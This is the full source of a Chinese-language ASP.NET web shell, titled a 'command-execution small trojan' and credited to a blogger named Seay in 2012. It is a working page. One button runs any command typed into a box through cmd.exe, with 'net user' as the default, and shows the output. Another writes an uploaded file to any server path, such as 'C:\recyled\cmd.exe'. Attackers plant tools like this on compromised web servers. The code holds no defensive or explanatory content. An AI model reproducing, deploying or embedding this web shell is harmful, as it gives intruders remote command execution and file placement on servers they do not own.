<%@ Page Language="C#" AutoEventWireup="true"  CodeFile="Default.aspx.cs" Inherits="_Default" %>
<%--作者:Seay 修改请保留版权 本人博客http://seay.sinaapp.com/  于：2012年8月22日--%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head runat="server">
    <title>Seay命令执行小马</title>
    <%@import Namespace="System.Diagnostics"%>
    <script language="C#" runat="server">
        
        void Button1_Click(object sender, System.EventArgs e)
        {
            try
            {
                string cmd = txt_cmdtxt.Text;
                string cmd_path = txt_cmdpath.Text;
                string cmd_msg = "";
                Process seay = new Process();
                seay.StartInfo.FileName = cmd_path;
                seay.StartInfo.UseShellExecute = false;
                seay.StartInfo.RedirectStandardInput = true;
                seay.StartInfo.RedirectStandardOutput = true;
                seay.StartInfo.RedirectStandardError = true;
                seay.Start();
                seay.StandardInput.WriteLine(cmd);
                seay.StandardInput.WriteLine("exit");
                cmd_msg = seay.StandardOutput.ReadToEnd();
                cmd_msg = cmd_msg.Replace("<", "&lt;");
                cmd_msg = cmd_msg.Replace(">", "&gt;");
                cmd_msg = cmd_msg.Replace("\r\n", "<br>");
                cmd_output.InnerHtml = "<hr width=\"100%\" noshade/><pre>" + cmd_msg + "</pre>";
            }
            catch (Exception error)
            {
                cmd_output.InnerHtml = error.Message;
            }
        }
        protected void Button2_Click(object sender, EventArgs e)
        {
            if (FileUpload1.FileName != "")
            {
                try
                {
                    string Filepath = txt_Filepath.Text;
                    FileUpload1.SaveAs(Filepath);
                    ClientScript.RegisterStartupScript(typeof(string), "", "alert('上传成功')", true);
                    cmd_output.InnerHtml = "上传成功!<br />文件路径：" + Filepath;
                }
                catch (Exception msg)
                {
                    cmd_output.InnerHtml = "上传失败<br />" + msg.Message;

                }
            }
            else
            {
                ClientScript.RegisterStartupScript(typeof(string), "", "alert('请先选择文件')", true);
            }
            
        }
 </script>
</head>
<body>
<center>
    <form id="form1" runat="server">
    <center><h2>Seay命令执行小马</h2></center>
    <div style="border-style: double; width: 1000px; background-color: #F0F0F0;">
        <br />
        <div style="background-color: #F0F0F0; width: 416px; height: 108px; float: none; text-align: left; margin-right: 0px;">
            本地文件：<asp:FileUpload ID="FileUpload1" runat="server" />
            <br />
            保存路径：<asp:TextBox ID="txt_Filepath" runat="server" style="margin-left: 0px" 
            Width="264px">C:\recyled\cmd.exe</asp:TextBox>&nbsp;<asp:Button 
                ID="Button2" runat="server" Height="21px" onclick="Button2_Click" 
                Text=" 上 传 " Width="56px" />
        <br />
        
            CMD路径：<asp:TextBox ID="txt_cmdpath" runat="server" style="margin-left: 0px" 
            Width="262px">C:\windows\system32\cmd.exe</asp:TextBox>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />
            CMD命令：<asp:TextBox ID="txt_cmdtxt" runat="server" style="margin-left: 0px" 
            Width="262px">net user</asp:TextBox>&nbsp;<asp:Button ID="Button1" 
                runat="server" Height="21px" Text=" 执 行 " 
            onclick="Button1_Click" />
        </div>
    <div id="cmd_output" runat="server" visible="True" enableviewstate="True" style="border-style: solid; border-width: inherit; border-color: #C0C0C0; text-align: left; font-weight: normal; width: 699px; height: auto">
 </div>
<h5>版权所有 © 2012 Seay 博客<a href="http://seay.sinaapp.com/">http://seay.sinaapp.com/</a><br />
专注网络安全 软件开发 程序测试</h5>
    </div>
    </form>
    </center>
</body>
</html>
